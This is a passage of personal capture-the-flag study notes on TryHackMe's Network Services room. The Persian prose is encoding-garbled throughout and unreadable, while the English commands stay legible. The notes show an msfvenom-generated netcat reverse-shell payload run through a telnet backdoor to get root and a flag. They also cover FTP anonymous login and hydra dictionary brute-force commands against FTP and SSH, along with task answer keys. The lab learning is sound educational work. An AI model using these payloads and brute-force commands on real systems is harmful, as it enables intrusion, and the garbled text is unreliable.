	5. Ú©Ø§ÙÛŒØ³Øª Ø¨Ù‡ ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ú©Ù‡ Ú©Ø§Ù†Ú©Ø´Ù† Telnet Ø¯Ø± Ø¢Ù† Ø¨ÙˆØ¯ Ø¨Ø§Ø² Ú¯Ø±Ø¯ÛŒÙ… Ùˆ Ø¯Ø± telnet Ø§Ø² Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯ØªØŒ Ø§ÛŒÙ†ØªØ±ÙÛŒØ³ `tun0` Ø¯Ø± `kali` Ø±Ø§ Ù¾ÛŒÙ†Ú¯ Ø¨Ú¯ÛŒØ±ÛŒÙ… ØªØ§ Ø¨ØªÙˆØ§Ù†ÛŒÙ… Ù†ØªÛŒØ¬Ù‡ Ø´Ù†ÙˆØ¯ Ø±Ø§ Ø¯Ø± ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ø¯ÙˆÙ… Ú©Ù‡ Ø¯Ø± Ø­Ø§Ù„ tcpdump Listening Ø§Ø³Øª Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ù†ÛŒÙ…:
		1. `telnet 10.10.5.166 8012`
		2. `telnet> .RUN ping 10.8.64.134 -c 1`
			1. ![[Pasted image 20240713201318.png]]
		3. Now go Back in Terminal 2 - `tcpdump listening results`
			1. ![[Pasted image 20240713201340.png]]
3. *Generate Reverse Shell Payload using `msfvenom`*
	0. Ø¯Ø± Ø§ÛŒÙ† Ù…Ø±Ø­Ù„Ù‡ Ø¨Ø§ÛŒØ¯ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² `msfvenom` ÛŒÚ© Payload Ø§ÛŒØ¬Ø§Ø¯ Ú©Ù†ÛŒÙ…. Ø¯Ø± Ø§ÛŒÙ† payload Ø¨Ø±Ù‚Ø±Ø§Ø±ÛŒ shell Ø¨ÙˆØ³ÛŒÙ„Ù‡ Ú©Ø§Ù…Ù†Ø¯ `netcat` Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒØ´ÙˆØ¯ Ùˆ Ø§Ø¨Ø²Ø§Ø± `msfvenom` Ø§ÛŒÙ† Payload Ø±Ø§ Encrypted Ù…ÛŒÚ©Ù†Ø¯.
	1. *Ù‚Ø¯Ù… Ø§ÙˆÙ„* Ø¨Ø§ÛŒØ¯ ØªÙ…Ø§Ù… Payload Ù‡Ø§ Ú©Ù‡ Ø¨Ø±Ø§ÛŒ `Netcat` Ù‡Ø³ØªÙ†Ø¯ Ø±Ø§ Ù„ÛŒØ³Øª Ú©Ù†ÛŒÙ… >>
		1. `msfvenom -l payloads | grep netcat`
			1. ![[Pasted image 20240713202054.png]]
		2. Ø³Ù¾Ø³ Ø¨Ø§ÛŒØ¯ Payload Ù…Ù†Ø§Ø³Ø¨ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒÙ… Ú©Ù‡ Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù…ÛŒØ®ÙˆØ§Ù‡ÛŒÙ… Ø§Ø² `cmd/unix/reverse_snetcat` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ….
	2. *Ù‚Ø¯Ù… Ø¯ÙˆÙ…* Ù¾Ø³ Ø§Ø² ÛŒØ§ÙØªÙ† Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Payload Ø¨Ø§ÛŒØ¯ Options Ù‡Ø§ÛŒ Ø¢Ù†Ø±Ø§ ØªÙ†Ø¸ÛŒÙ… Ú©Ù†ÛŒÙ… Ùˆ Payload Ø±Ø§ ØªÙˆÙ„ÛŒØ¯ Ú©Ù†ÛŒÙ… >>
		1. `msfvenom -p cmd/unix/reverse_netcat LHOST=10.8.64.134 LPORT=444`
			1. ![[Pasted image 20240713202405.png]]
		2. Ø­Ø§Ù„ Payload Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª ØªÙˆÙ„ÛŒØ¯ Ùˆ Ú©Ø§ÙÛŒØ³Øª Ú©Ø§Ù…Ù†Ø¯ Ù‡Ø§ÛŒ Payload Ø±Ø§ Ú©Ù¾ÛŒ Ú©Ù†ÛŒÙ…:
			1. `mkfifo /tmp/msnht; nc 10.8.64.134 444 0</tmp/msnht | /bin/sh >/tmp/msnht 2>&1; rm /tmp/msnht`
				1. ![[Pasted image 20240713202447.png]]
	3. *Ù‚Ø¯Ù… Ø³ÙˆÙ…* Ø­Ø§Ù„ Ø¨Ø§ÛŒØ¯ Ù…Ø§Ø´ÛŒÙ† Kali Ø±Ø§ Ø¨Ù‡ Ø­Ø§Ù„Øª Listening Netcat Ø¨Ø¨Ø±ÛŒÙ… >> 
		1. Ø¯Ù‚Øª Ú©Ù†ÛŒØ¯ Ú©Ù‡ Ø¨Ø§ÛŒØ¯ Ù…Ø§Ø´ÛŒÙ† Ø¯Ø± Ù¾ÙˆØ±ØªÛŒ Ø¨Ù‡ Ø­Ø§Ù„Øª Listening Ø¨Ø¨Ø±ÛŒÙ… Ú©Ù‡ Ø¯Ø±  Payload Ø¯Ø± `LPORT` Ù…Ø´Ø®Øµ Ú©Ø±Ø¯ÛŒÙ….
		2. `nc -lnvp 444`
			1. ![[Pasted image 20240713202739.png]]
		3. ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ø±Ø§ Minimize Ù…ÛŒÚ©Ù†ÛŒÙ… ØªØ§ payload Ø±Ø§ Ø§Ø² Ø·Ø±ÛŒÙ‚ backdoor Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ….
	4. *Ù‚Ø¯Ù… Ú†Ù‡Ø§Ø±Ù…* Ø­Ø§Ù„ Ø¨Ø§Ø¨Ø¯ Payload Ø±Ø§ Ø§Ø² Ø·Ø±ÛŒÙ‚ backdoor Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ… >>
		1. `telnet 10.10.174.31 8012`
		2. `.RUN mkfifo /tmp/msnht; nc 10.8.64.134 444 0</tmp/msnht | /bin/sh >/tmp/msnht 2>&1; rm /tmp/msnht`
		3. Ø¨Ø§ Ø§Ø¬Ø±Ø§ÛŒ PayloadØŒ Ø¯Ø± ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ø§ÙˆÙ„ Ú©Ù‡ Netcat Ø¯Ø± Ø­Ø§Ù„Øª Listening Ø¨ÙˆØ¯ Ù…ÛŒØªÙˆØ§Ù†Ø¯ Ø¨Ù‡ Ø´Ù„ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ú¯ÛŒØ±Ø¯ Ùˆ Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ù‡Ø± Ú©Ø§Ù…Ù†Ø¯ÛŒ Ø§Ø¬Ø±Ø§ Ú©Ù†Ø¯ Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø² Ø·Ø±ÛŒÙ‚ backdoor Ø§Ø¬Ø±Ø§ Ù…ÛŒØ´ÙˆØ¯.
			1. ![[Pasted image 20240713203541.png]]
	5. *Ù‚Ø¯Ù… Ù¾Ù†Ø¬Ù…*Ø­Ø§Ù„ Ø¯Ø± ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ø¯Ø± Ø­Ø§Ù„ Ø´Ù†ÙˆØ¯ Netcat(ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ø¯ÙˆÙ…) Ú©Ù‡ Ù¾Ø³ Ø§Ø² Ø§Ø¬Ø±Ø§ÛŒ Payload Ø¨Ù‡ Shell Target ØªØºÛŒÛŒØ± Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯Ù‡ Ø§Ø³ØªØŒ Ø¯Ø± ÙˆØ§Ù‚Ø¹ ÛŒÚ© Reverse Shell Ø§Ø² Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø² Ø·Ø±ÛŒÙ‚ Ø§Ø¬Ø±Ø§ÛŒ Payload Ø¯Ø±  BackdoorØŒ Ø¯Ø± ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ø¯ÙˆÙ… Ø¨Ø±Ø§ÛŒ Ù…Ø§ Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ø§Ø³Øª >>
		1. Ø¯Ø± Ø§ÛŒÙ† Ù…Ø±Ø­Ù„Ù‡ Ø¨Ø§ÛŒØ¯ ÙÙ„Ú¯ Ù…Ø±Ø­Ù„Ù‡ Ø±Ø§ Ù¾ÛŒØ¯Ø§ Ú©Ù†ÛŒÙ…. Ú©Ø§ÙÛŒØ³Øª Ø§Ø² ÙØ§ÛŒÙ„ Ù‡Ø§ÛŒ Ø¯Ø±ÙˆÙ† Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª `ls` Ø¨Ú¯ÛŒØ±ÛŒÙ… Ùˆ Ø³Ù¾Ø³ ÙØ§ÛŒÙ„ Ù…ÙˆØ±Ø¯ Ù†Ø¸Ø± Ø±Ø§ Ø¨Ø§Ø² Ù…ÛŒÚ©Ù†ÛŒÙ… Ùˆ Ù…Ù‚Ø¯Ø§Ø± ÙÙ„Ú¯ Ø±Ø§ Ú©Ù¾ÛŒ Ú©Ù†ÛŒÙ… ØªØ§ Ø¯Ø± Ø¬ÙˆØ§Ø¨ Ø³ÙˆØ§Ù„Ø§Øª Ø¨Ù†ÙˆÛŒØ³ÛŒÙ…:
			1. ![[Pasted image 20240713204050.png]]
	6. Ù¾Ø³ Ø§Ø² ÛŒØ§ÙØªÙ† flag ğŸš© Ø¨Ø±Ø§ÛŒ Ø¬ÙˆØ§Ø¨ Ø³ÙˆØ§Ù„Ø§ Ù…ÛŒØ±ÙˆÛŒÙ….
4. *TASK 6 Q_&_A*
	1. *Ø³ÙˆØ§Ù„ Ø§ÙˆÙ„*
		1. How many port open? `1`
	2. *Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ…* 
		1. Whats Port? `8012`
	3. *Ø³ÙˆØ§Ù„ Ø³ÙˆÙ…*
		1. Whats Protocol of Open Port? `tcp`
	4. *Ø³ÙˆØ§Ù„ Ú†Ù‡Ø§Ø±Ù…*
		1. Rerun nmap without `-p-`, how many port open under 1000? `0`
	5. *Ø³ÙˆØ§Ù„ Ù¾Ù†Ø¬Ù…*
		1. What you think this port cloud be used for? `a backdoor`
	6. *Ø³ÙˆØ§Ù„ Ø´Ø´Ù…*
		1. this backdoor belong to? gathering possible username
	7. *Ø³ÙˆØ§Ù„ Ù‡ÙØªÙ…*
		1. Run ping on telnet via backdoor and Listening communication in Kali machine `Y`
	8. *Ø³ÙˆØ§Ù„ Ù‡Ø´ØªÙ…*
		1. what word does generate payload start with?  `mkfifo`
			1. ![[Pasted image 20240713204538.png]]
	9. *Ø³ÙˆØ§Ù„ Ù†Ù‡Ù…*
		1. command for listening port we selected in our payload? `nc -lnvp 444`
			1. ![[Pasted image 20240713204418.png]]
	10. *Ø³ÙˆØ§Ù„ Ø¯Ù‡Ù…*
		1. Whats content of flag.txt? `THM{y0u_g0t_th3_t3ln3t_fl4g}`
			1. ![[Pasted image 20240713204241.png]]
-----
```sh Terminal 1
nmap -sS -sV -O 10.10.5.166
nmap -sS -sV -O -p- 10.10.5.166
-----
telnet 10.10.5.166 8012
telnet> .HELP
telnet> .RUN ping 10.8.64.134 -c 1 #10.8.64.134 is 'tun0' IP
"now run payload to get accessing to listening terminal on 444"
telnet> .RUN mkfifo /tmp/msnht; nc 10.8.64.134 444 0</tmp/msnht | /bin/sh >/tmp/msnht 2>&1; rm /tmp/msnht
```
----
```sh Terminal 2
ifconfig #afte telnet connected, "tun0" now be added to network interfaces
"After Telnet Established in Terminal 1 start tcpdump Listening"
tcpdump ip proto \\icmp -i tun0
msfvenom -l payloads | grep netcat #list all payloads for netcat
msfvenom -p cmd/unix/reverse_netcat LHOST=10.8.64.134 LPORT=444 #Generate Payload for netcat on Port 444
nc -lnvp 444
"Now Netcat Listening to 444 tcp port" #Wait for run payload on target
whoami
"After Payload running on Target machine, below commands run in target machine"
#root
ls
#flag.txt
```
### FTP Exploitation - E55
#### Definition & Instruction
##### What is FTP(File Transfer Protocol)?
- `FTP(File Transfer Protocol) - TCP/21`
- Ø§Ø² Ù¾Ø±ÙˆØªÚ©Ù„ FTP(File Transfer Protocol) Ø¨Ø±Ø§ÛŒ Ø§Ù†ØªÙ‚Ø§Ù„ ÙØ§ÛŒÙ„ Ø¯Ø± Ø¨Ø³ØªØ± Network Ùˆ Ø¨ØµÙˆØ±Øª Ø±ÛŒÙ…ÙˆØª Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒØ´ÙˆØ¯. Ù¾Ø±ÙˆØªÚ©Ù„ FTP ÛŒÚ© Ù¾Ø±ÙˆØªÚ©Ù„ `Client/Server` Ø§Ø³Øª.
- Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¯Ø§Ø¯Ù‡ Ø¯Ø± FTPØŒ Ú©Ù„Ø§ÛŒÙ†Øª Ø§Ø¨ØªØ¯Ø§ Ú©Ø§Ù†Ú©Ø´Ù†ÛŒ Ø±Ø§ Ø¨Ù‡ Ø³Ù…Øª Ø³Ø±ÙˆØ± Ø¨Ø±Ù‚Ø±Ø§Ø± Ù…ÛŒÚ©Ù†Ø¯ØŒ Ø­Ø§Ù„ Ø³Ø±ÙˆØ± Ø¨Ø§ Ø¨Ø±Ø±Ø³ÛŒ Credential Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø¯Ø± ØµÙˆØ±Øª ØµØ­ÛŒØ­ Ø¨ÙˆØ¯Ù† Login Credential Ø§Ø±ØªØ¨Ø§Ø· Ø³Ø±ÙˆØ± Ùˆ Ú©Ù„Ø§ÛŒÙ†Øª Ø¨Ø±Ù‚Ø±Ø§Ø± Ù…ÛŒØ´ÙˆØ¯ Ùˆ Ø¨Ù‡ Ø§ØµØ·Ù„Ø§Ø­ Session Ù…Ø§Ø¨ÛŒÙ† Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± ØªØ´Ú©ÛŒÙ„ Ù…ÛŒØ´ÙˆØ¯.
- Ø­Ø§Ù„ ØªØ§ Ù‡Ù†Ú¯Ø§Ù…ÛŒÚ©Ù‡ Session Ø¨ÛŒÙ† Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± Ø¨Ø§Ø² Ø¨Ø§Ø´Ø¯ØŒ Ú©Ù„Ø§ÛŒÙ†Øª Ù…ÛŒØªÙˆØ§Ù†Ø¯ FTP Commands Ù‡Ø§ÛŒÛŒ Ø±Ø§ Ø¨Ø± Ø±ÙˆÛŒ Ø³Ø±ÙˆØ± Ø§Ø¬Ø±Ø§ Ú©Ù†Ø¯.
##### FTP Enumeration
Ø¨Ø±Ø§ÛŒ Ú©Ø³Ø¨ Ø§Ø·Ù„Ø§Ø¹Ø§Øª(Enumeration) Ø§Ø² Ù¾ÙˆØ±Øª 21 Ú©Ù‡ Ù…Ø±Ø¨ÙˆØ· Ø¨Ù‡ FTP Ø§Ø³ØªØŒ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ø§Ø³Ú©Ù†Ø± Nmap Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ….
	![[Pasted image 20240713160034.png]]
Ù‡Ù…Ú†Ù†ÛŒÙ† Ù…ÛŒØ¯Ø§Ù†ÛŒÙ… Ø¨Ø±Ø§ÛŒ Ù…ØªØµÙ„ Ø´Ø¯Ù† Ø¨Ù‡ ÛŒÚ© FTP Server Ø¯Ø± ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ú©Ø§Ù…Ù†Ø¯ Ø²ÛŒØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ… >>
- `ftp 192.168.110.20`
##### FTP Exploit with `hydra` in Bruteforce 
Ø¨Ø±Ø§ÛŒ Ù¾ÛŒØ§Ø¯Ù‡ Ø³Ø§Ø²ÛŒ Ø­Ù…Ù„Ù‡ Brute Force Ø¨Ø± Ø±ÙˆÛŒ Ù¾ÙˆØ±Øª 21 FTP Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ø§Ø¨Ø²Ø§Ø± `hydra` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ…. Ø¯Ø± Ø§ÛŒÙ† Ù†ÙˆØ¹ Ø­Ù…Ù„Ù‡ ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±Ø¯Ù† Ù…Ù‚Ø¯Ø§Ø± Ù¾Ø³ÙˆØ±Ø¯ Brute Force Ø±Ø§ Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒØ¯Ù‡ÛŒÙ… Ùˆ Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ø¨Ø§ÛŒØ¯ ÛŒÚ© Username Ú©Ù‡ Ù…ÛŒØ®ÙˆØ§Ù‡ÛŒÙ… Ù¾Ø³ÙˆØ±Ø¯ Ø¢Ù† Ø±Ø§ Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±ÛŒÙ… Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒÙ…. Ø§Ù„Ø¨ØªÙ‡ Ù…ÛŒØªÙˆØ§Ù† ÛŒÚ© wordlist Ø±Ø§ Ø¨Ø±Ø§ÛŒ Username Ù‡Ø§ Ù‡Ù… Ø¯Ø± Ù†Ø¸Ø± Ú¯Ø±ÙØª.
	![[Pasted image 20240713160700.png]]
```sh
hydra -l davoodya -P /usr/share/wordlists/rockyou.txt 192.168.10.1 ftp -v
```
- Ø¯Ø± Ù…Ø«Ø§Ù„ Ø¨Ø§Ù„Ø§ØŒ Ø­Ù…Ù„Ù‡ Brute Force with Dictionary Ø¨Ù‡ Ø±ÙˆØªØ± 192.168.10.1 Ùˆ Ù¾ÙˆØ±Øª 21-FTP Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒØ´ÙˆØ¯. Ø§ÛŒÙ† Ø­Ù…Ù„Ù‡ Ø¨Ø±Ø§ÛŒ ÛŒØ§ÙØªÙ† Ù¾Ø³ÙˆØ±Ø¯ ÛŒÙˆØ²Ø± Ù†ÛŒÙ… davoodya Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒØ´ÙˆØ¯. Ø¯Ø± Ø§ÛŒÙ† Ø­Ù…Ù„Ù‡ Ø§Ø² Rockyou.txt Ù‡Ù… Ø¨Ù‡ Ø¹Ù†ÙˆØ§Ù† Ø¯ÛŒÚ©Ø´Ù†Ø±ÛŒ Ø­Ù…Ù„Ù‡ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒØ´ÙˆØ¯. 
- Ø§Ú¯Ø± Ø¨Ø®ÙˆØ§Ù‡ÛŒÙ… Ø­Ù…Ù„Ù‡ Ø¯Ø± Ù¾ÙˆØ±Øª Ø¯ÛŒÚ¯Ø±ÛŒ Ø§Ù†Ø¬Ø§Ù… Ø´ÙˆØ¯ØŒ Ø¨Ø§ÛŒØ¯ Ø¨Ø¬Ø§ÛŒ `ftp` Ø¯Ø± Ú©Ø§Ù…Ù†Ø¯ Ø´Ù…Ø§Ø±Ù‡ Ù¾ÙˆØ±Øª `12921` Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒÙ…. Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ø§Ø² Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ø±Ø§ÛŒ Ù¾ÛŒØ§Ø¯Ù‡ Ø³Ø§Ø²ÛŒ Ø­Ù…Ù„Ø§Øª Brute Force Ø¨Ø± Ø±ÙˆÛŒ Ø§Ù†ÙˆØ§Ø¹ Ø³Ø±ÙˆÛŒØ³ Ù‡Ø§ Ù…Ø§Ù†Ù†Ø¯ SSH, Telnet, FTP, .... Ù…ÛŒØ¨Ø§Ø´Ø¯.
```sh
hydra -L ./users.txt -P ./rockyou.txt 10.10.196.16 22 -v #22 is 'SSH'
```
- Ø§Ø² Ø§Ø¨Ø²Ø§Ø± Ù‡Ø§ÛŒ Ø¯ÛŒÚ¯Ø± Ø¯Ø± Ø§ÛŒÙ† Ø¯Ø³ØªÙ‡ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ `Medusa` Ø§Ø´Ø§Ø±Ù‡ Ú©Ù†ÛŒÙ….
```sh
medusa --help
```
#### Practical Demo
##### TASK 8 - FTP
Ø¨Ø±Ø§ÛŒ ØªÙ…Ø±ÛŒÙ† Ø§ÛŒÙ† Ù…ÙˆØ¶ÙˆØ¹ØŒ Ø¨Ù‡ Ø¢Ø²Ù…Ø§ÛŒØ´Ú¯Ø§Ù‡ Try Hack Me Ùˆ Ø±ÙˆÙ… Ø¨Ù†Ø§Ù… `Network Services Room` Ù…ÛŒØ±ÙˆÛŒÙ…:
- https://tryhackme.com/room/networkservices
	- ![[Pasted image 20240713161903.png]]
1. *TASK 8 Questions*
	1. What Communication Model does FTP use? `client-server`
	2. Whats Standard FTP Protocol? `21`
	3. How Many Modes are FTP Connection are there? `2`
		1. ![[Pasted image 20240713162138.png]]
##### TASK 9 - Enumerating FTP
1. *Pre-Pre Lab & Machine*
	1. Start TASK 9 Machine
		1. ![[Pasted image 20240713162312.png]]
	2. Copy Machine IP 
		1. ![[Pasted image 20240713162434.png]]
	3. Power On Kali on VMWare and Open Terminal
	4. `ping MACHINEIP` => `ping 10.10.223.220` if ping ok goto next step.
		1. ![[Pasted image 20240713162600.png]]
2. *Scan 1 - Services & Port Detection*
	1. Ø¯Ø± Ø§Ø³Ú©Ù† Ø§ÙˆÙ„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª ØªÙ…Ø§Ù… Ø³Ø±ÙˆÛŒØ³ Ù‡Ø§ Ùˆ Ù¾ÙˆØ±Øª Ù‡Ø§ÛŒÛŒ Ú©Ù‡ Ø¨Ø± Ø±ÙˆÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª ÙØ¹Ø§Ù„ Ù‡Ø³ØªÙ†Ø¯ Ø±Ø§ Ø¨Ø¯Ø³Øª Ù…ÛŒØ§ÙˆØ±ÛŒÙ….
	2. `sudo nmap -sS -A -T4 10.10.223.220`
		1. `-sS` TCP SYN Scan(Hidden Src from Target)
		2. `-A` Detection all services and ports in target machine
		3. `-T4` Speed UP Scan
	3. *Read Scan Results*
		1. Ø¯Ø± Ù†ØªÛŒØ¬Ù‡ Ø§Ø³Ú©Ù† Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ù†ÛŒÙ… Ú©Ù‡ Ù¾ÙˆØ±Øª `21/tcp` Ù…Ø±Ø¨ÙˆØ· `ftp` Ø¯Ø± State Open Ù‚Ø±Ø§Ø± Ø¯Ø§Ø±Ø¯ØŒ Ù‡Ù…Ú†Ù†ÛŒÙ† Ø³Ø±ÙˆÛŒØ³ `vsftpd 2.0.8` Ù‡Ù… Ø¨Ø± Ø±ÙˆÛŒ ØªØ§Ø±Ú¯Øª ÙØ¹Ø§Ù„ Ø§Ø³Øª:
			1. ![[Pasted image 20240713163044.png]]
		2. ÛŒÚ©ÛŒ Ø¯ÛŒÚ¯Ø± Ø§Ø² Ù…ÙˆØ§Ø±Ø¯ÛŒ Ú©Ù‡ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ø¢Ù† Ø¨Ø±Ø§ÛŒ Ù†ÙÙˆØ° Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ… `Anonymous ftp login` Ø§Ø³Øª Ú©Ù‡ Ø¨Ø± Ø±ÙˆÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ù…Ø§ Ù‡Ù… ÙØ¹Ø§Ù„ Ø§Ø³Øª:
			1. ![[Pasted image 20240713163348.png]]
		3. Ù‡Ù…Ú†Ù†ÛŒÙ† Ø§Ø·Ù„Ø§Ø¹Ø§Øª FTP Server Ú©Ù‡ Ø¨Ø± Ø±ÙˆÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª ÙØ¹Ø§Ù„ Ø§Ø³Øª Ø¨Ù‡ Ø´Ø±Ø­ Ø²ÛŒØ± Ø§Ø³Øª:
			1. ![[Pasted image 20240713163228.png]]
3. *Scan 2 - All Ports Detection*
	1. Ø¯Ø± Ø§Ø³Ú©Ù† Ø¯ÙˆÙ…ØŒ ØªÙ…Ø§Ù… Ù¾ÙˆØ±Øª Ù‡Ø§ Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ù…ÛŒÚ©Ù†ÛŒÙ… Ú©Ù‡ Ø¨Ø¨ÛŒÙ†ÛŒÙ… Ø¢ÛŒØ§ Ø¨Ù‡ ØºÛŒØ± Ø§Ø² FTP Ù¾ÙˆØ±Øª Ø¯ÛŒÚ¯Ø±ÛŒ Ù‡Ù… Ø¨Ø§Ø² Ø§Ø³Øª. Ø§ÛŒÙ† Ø§Ø³Ú©Ù† Ø±Ø§ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ Ø¯Ùˆ Ø´Ú©Ù„ Ø§Ù†Ø¬Ø§Ù… Ø¯Ù‡ÛŒÙ….
	2. `sudo nmap -sS 10.10.223.220` 
		1. ![[Pasted image 20240713163829.png]]
	3. `sudo nmap -p- 10.10.223.220`
		1. ![[Pasted image 20240713163842.png]]
	4. *Read Scan Results*
		1. Ø¯Ø± `TCP SYN` Ø§Ø³Ú©Ù† Ø¯ÛŒØ¯Ù… Ú©Ù‡ 999 Ù¾ÙˆØ±Øª Ø²ÛŒØ± 1000 Ø¨Ø³ØªÙ‡ Ù‡Ø³ØªÙ†Ø¯ ÛŒØ¹Ù†ÛŒ ÙÙ‚Ø· Ù¾ÙˆØ±Øª `FTP 21/tcp` Ø¨Ø§Ø² Ø§Ø³Øª.
		2. Ø¯Ø± `Port Scan`  Ù‡Ù… Ø¯Ù‚ÛŒÙ‚Ø§ Ù†ØªÛŒØ¬Ù‡ Ø§ÛŒ Ù…Ø§Ù†Ù†Ø¯ Ø§Ø³Ú©Ù† Ø§ÙˆÙ„ `Full Scan` Ø¯Ø§Ø´ØªÛŒÙ….
4. *Enumerating FTP Anonymous Login*
	1. Ø¯Ø± Ù†ØªÛŒØ¬Ù‡ Ø§Ø³Ú©Ù† Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ø±Ø¯ÛŒÙ… Ú©Ù‡ Anonymous Login Ø¨Ù‡ FTP Server Ù…Ø¬Ø§Ø² Ø§Ø³Øª. Ø¨Ù†Ø§Ø¨Ø±Ø§ÛŒÙ† Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§ÛŒÙ†Ú©Ø§Ø± Ø±Ø§ Ø§Ù†Ø¬Ø§Ù… Ø¯Ù‡ÛŒÙ… >>
	2. `ftp 10.10.223.220`
	3. Enter `anonymous` for `Username` and `Leave Password as Blank`
	4. Ø­Ø§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆÛŒØ³ FTP Ø¯Ø± 10.10.223.220 Ø¨Ø§ ÛŒÙˆØ²Ø± anonymous Ù„Ø§Ú¯ÛŒÙ† Ú©Ø±Ø¯ÛŒÙ… Ùˆ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… ØªÙ…Ø§Ù… Ú©Ø§Ù…Ù†Ø¯ Ù‡Ø§ÛŒ FTP Ø±Ø§ Ø¨Ø± Ø±ÙˆÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ… >>
		1. `ftp> ls`
		2. `ftp> get PUBLIC_NOTICE.txt`
		3. Ø¨Ø±Ø§ÛŒ Ø¯Ø§Ù†Ù„ÙˆØ¯ ÙØ§ÛŒÙ„ Ø§Ø² Ø³Ø±ÙˆØ± FTP Ø§Ø² Ú©Ø§Ù…Ù†Ø¯ `get` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒÚ©Ù†ÛŒÙ….
	5. Ø­Ø§Ù„ ÙØ§ÛŒÙ„ `PUBLIC_NOTICE.txt` Ø¯Ø± Ø¯Ø§ÛŒØ±Ú©ØªÙˆØ±ÛŒ `home/` Ø¯Ø§Ù†Ù„ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª Ùˆ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¢Ù†Ø±Ø§ Ø¨Ø§Ø² Ú©Ù†ÛŒÙ….
	6. `cat ~/PUBLIC_NOTICE.txt`
5. Select Suitable Service's base on Scan Results for Initializing Exploit
